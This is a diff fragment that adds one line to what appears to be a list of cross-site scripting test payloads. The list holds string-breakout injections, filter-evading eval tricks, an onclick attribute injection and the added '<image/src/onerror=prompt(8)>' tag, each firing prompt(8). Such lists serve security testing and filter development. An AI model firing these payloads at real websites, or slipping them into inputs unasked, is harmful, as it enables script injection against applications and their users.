@@ -2,6 +2,7 @@
 '-prompt(8)-'
 ";a=prompt,a()//
 ';a=prompt,a()//
+<image/src/onerror=prompt(8)>
 '-eval("window['pro'%2B'mpt'](8)")-'
 "-eval("window['pro'%2B'mpt'](8)")-"
 "onclick=prompt(8)>"@x.y
